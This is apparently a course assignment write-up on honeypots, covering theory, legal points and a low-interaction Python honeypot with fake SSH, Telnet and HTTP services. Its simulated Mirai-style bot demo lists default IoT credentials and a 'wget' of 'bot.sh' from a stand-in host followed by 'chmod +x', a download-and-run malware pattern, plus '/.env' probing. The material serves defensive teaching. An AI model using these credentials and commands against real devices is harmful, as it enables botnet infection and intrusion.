# Assignment 7: Study of Honeypot

## Aim

Study of Honeypot.

> `7_Honeypot/README.md` is a complete written study (definition, purpose, classification, tools, placement, advantages, legal points). This note summarises the key theory for revision, then explains the working code `honeypot.py` in detail.

## Theory and Fundamentals

### Definition
A **honeypot** is a decoy system that looks like a valuable target but has no real production use. Since no genuine user should touch it, **every connection is suspicious**, so its logs have very few false positives. Spitzner's definition: *a resource whose value lies in being probed, attacked or compromised.*

### Purposes
Early detection, research on attacker tools and passwords, deception (waste attacker's time), evidence collection, and threat intelligence (bad IPs, malware hashes).

### Classification

| By interaction | What attacker gets | Risk | Examples |
| --- | --- | --- | --- |
| **Low** | Fake banners / login prompts only | Very low | Honeyd, Dionaea, **this project** |
| **Medium** | Fake shell or file system, runs fake commands | Low | Cowrie, Glastopf |
| **High** | A real OS and services | High (can be abused) | Real VMs in a **Honeynet** |

Other types:
- **Production vs research** honeypots (protect a company vs study attackers).
- **Server-side vs client-side** (the latter visits malicious websites, e.g. Thug).
- **Honeynet:** several honeypots behind a monitoring gateway.
- **Honeytoken:** fake data (fake API key, fake DB record, fake e-mail) that raises an alert when used.
- **Spam trap**, **database honeypot**, **SCADA/ICS honeypot** (Conpot).

### Placement
In the **DMZ / outside the firewall** to see Internet-wide scanning, or **inside the LAN** where any hit means an attacker or malware is already inside.

### Advantages and disadvantages
Advantages: few false positives, catches unknown attacks, cheap, small but valuable data. Disadvantages: sees only attacks aimed at itself, can be fingerprinted, high-interaction ones can be taken over, needs maintenance, legal and privacy questions.

### Legal and ethical points
Not entrapment, because the honeypot only waits. Isolate it and limit outbound traffic so it cannot attack others. Logs may hold personal data. In India, unauthorised access is an offence under IT Act 2000 Sections 43 and 66, so honeypot logs can support a complaint.

### Concepts met in the code
- **Banner:** the text a service sends on connect (e.g. `SSH-2.0-OpenSSH_7.4p1`). An old version looks "vulnerable" and attracts attackers.
- **Telnet:** unencrypted remote login on port 23 (IoT devices use it, and the **Mirai** botnet spread by guessing default Telnet passwords such as `root/vizxv`).
- **Default credentials**, **bots/scanners**, **download-and-run** malware pattern (`wget` then `chmod +x`).
- **JSON Lines** (`.jsonl`): one JSON object per line, easy to log and parse.

## How the Code Works

File: `7_Honeypot/honeypot.py` (standard library only). It runs three fake services as threaded TCP servers (`socketserver.ThreadingTCPServer`), all writing to `honeypot_log.jsonl`.

| Service | Port | Handler | Records |
| --- | --- | --- | --- |
| SSH | 2222 | `FakeSSH` | connect, client version string |
| Telnet | 2323 | `FakeTelnet` | connect, every username/password, every command, disconnect |
| HTTP | 8080 | `FakeHTTP` | method, path, User-Agent, submitted credentials |

### Logging
`log_event(service, ip, event, **data)` builds a record with time, service, source IP and event, appends it as one JSON line (protected by a `threading.Lock`) and prints it.

### FakeSSH (low interaction)
It sends an old OpenSSH banner, reads the client's own version line, logs it and stops. A real SSH honeypot (Cowrie) would continue the key exchange; this one does not.
```python
self.request.sendall(b"SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7\r\n")
client = self.request.recv(256).split(b"\r\n")[0].decode(errors="replace")
log_event("ssh", ip, "client", version=client)
```

### FakeTelnet (a fake shell)
- `read_line()` reads a line byte by byte and skips Telnet negotiation (`0xFF` IAC) bytes.
- Up to 3 login attempts: each username/password is **logged**. Weak passwords (`123456`, `admin`, `root`, `password`) are accepted, others get "Login incorrect" after 1 s, and the third attempt is always accepted. This lures the attacker to reveal what he does next.
- The fake prompt `root@fileserver:~#` accepts commands, logs each one and answers from a fixed dictionary `FAKE_OUTPUT` (`whoami`, `id`, `uname -a`, `ls`...). `wget`, `curl`, `chmod`, `cd` return empty output; others give "command not found". **Nothing is ever executed** and `wget` URLs are not fetched.

### FakeHTTP (router login page)
Parses the request line, headers and a POST body (limited to 4096 bytes). A `POST` is logged as a `login` event with `username`, `password`, `user_agent`; every other request is logged as `request`. Both return a "NetGear-Pro R7000 Administration" login page with a `lighttpd` Server header.

### Start-up and summary
`start(host)` launches the three servers in daemon threads. By default `host` is `127.0.0.1`; `--public` binds `0.0.0.0` (only for an isolated lab). `summary()` reads the log and prints totals, top attacker IPs, credentials tried, commands typed, web paths scanned and SSH client versions.

### Demo attackers
`demo_attacks()` simulates: an SSH scanner (`libssh2_1.9.0`); a Mirai-style Telnet bot that tries `admin/admin123`, `root/vizxv`, `root/123456`, then `whoami`, `uname -a`, `cd /tmp`, `wget http://203.0.113.9/bot.sh`, `chmod +x bot.sh`, `exit`; and web scanners requesting `/admin`, `/.env` and a Hydra POST. The program then asserts that every service captured activity.

## How to Run and Expected Output

```bash
python LP4/CSDF/7_Honeypot/honeypot.py --demo        # honeypot + simulated attackers + summary
python LP4/CSDF/7_Honeypot/honeypot.py               # run it and attack it yourself
telnet 127.0.0.1 2323                                #   try admin/admin, type commands
ssh -p 2222 root@127.0.0.1                           #   banner and client version captured
#   browser: http://127.0.0.1:8080/admin             #   submit the login form
python LP4/CSDF/7_Honeypot/honeypot.py --summary     # statistics from honeypot_log.jsonl
python LP4/CSDF/7_Honeypot/honeypot.py --public      # all interfaces: isolated lab VM only
```

Real output (trimmed):

```
[22:43:47] ssh    127.0.0.1  client   version='SSH-2.0-libssh2_1.9.0'
[22:43:48] telnet 127.0.0.1  login    username='root' password='vizxv'
[22:43:49] telnet 127.0.0.1  command  command='wget http://203.0.113.9/bot.sh'
[22:43:49] http   127.0.0.1  request  method='GET' path='/.env' user_agent='python-requests/2.31'
HONEYPOT SUMMARY
Total events: 16   Connections: 2   Login attempts: 4
Events per service: ssh 2, telnet 11, http 3
Self-check passed: all three fake services captured the attacker's actions.
```

How to read it: the bot's sequence (look around, go to `/tmp`, download `bot.sh`, make it executable) is the classic malware-installation pattern; `/.env` probing hunts for leaked secrets. In the demo every IP is 127.0.0.1 because the attackers run on the same machine. "Connections: 2" counts only SSH and Telnet connect events; HTTP requests are logged as `request`/`login`.

## Related Concepts and Real-World Tools

- **Cowrie** (medium interaction SSH/Telnet, records sessions and downloaded files), **Dionaea** (malware capture), **Honeyd**, **Conpot** (ICS), **Glastopf / SNARE** (web), **Kippo** (older).
- **T-Pot:** all-in-one platform running 20+ honeypots with an Elastic dashboard; **Honeynet Project**; **OpenCanary** and **Canarytokens** (honeytokens).
- **Commercial deception:** Attivo / SentinelOne Ranger, Illusive.
- **Internet-wide scanners** (Shodan, Censys) will find a public honeypot within hours, which is how the data is generated.
- **Feeds the other assignments:** IPs and payloads can become Snort rules (Assignment 6) and log-correlation inputs (Assignment 5).
- **Legal:** IT Act 2000 Sections 43, 66 (attackers), Section 72 (breach of privacy/confidentiality) when handling collected data; keep logs hashed for evidence (Assignment 11).

## Viva Questions

1. **What is a honeypot?** A decoy system with no legitimate use that attracts attackers, so every interaction is suspicious and gets logged.
2. **Why does a honeypot give few false positives?** Because no real user has any reason to connect to it.
3. **Explain low, medium and high interaction honeypots.** Low emulates only banners/prompts (safe, little data); medium emulates a shell or file system (Cowrie); high is a real system (most data, most risk).
4. **Which type is `honeypot.py`?** Low interaction, with a small fake shell on Telnet. Nothing is executed and the SSH service stops after the banner exchange.
5. **What is a honeynet and a honeytoken?** A honeynet is a network of honeypots with a monitoring gateway; a honeytoken is fake data (a key, record or e-mail) that triggers an alert when used.
6. **Where should a honeypot be placed?** In the DMZ or outside the firewall to see Internet attacks, and inside the LAN to catch attackers or malware that are already inside.
7. **What did the Telnet bot in the demo try to do?** Guess default passwords, run recon commands, then `wget` a script, `chmod +x` it, i.e. download and run malware.
8. **What are the risks of running a honeypot?** It can be fingerprinted, a high-interaction one can be hijacked to attack others, and logs may include personal data. So isolate it, limit outbound traffic and bind to localhost unless in a lab.
9. **How are honeypots different from an IDS or a firewall?** They do not filter or inspect real traffic; they are bait that produces high-quality evidence of attacker behaviour.
10. **Is a honeypot legal and is it entrapment?** It only waits and does not induce anyone to commit a crime, so it is generally accepted; privacy and liability rules still apply.
